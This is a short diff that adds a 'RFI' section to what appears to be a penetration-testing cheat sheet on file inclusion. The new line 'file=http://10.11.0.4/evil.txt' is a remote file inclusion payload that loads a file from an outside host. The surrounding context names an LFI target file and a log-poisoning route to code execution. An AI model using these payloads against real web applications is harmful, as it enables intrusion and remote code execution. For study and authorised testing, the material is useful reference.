@@ -18,6 +18,11 @@ c:\boot.ini for windows
 
 ```
 
+## RFI
+```
+file=http://10.11.0.4/evil.txt
+```
+
 ## LFI to RCE - Log Poisoning
 ```
 # Modify user agent
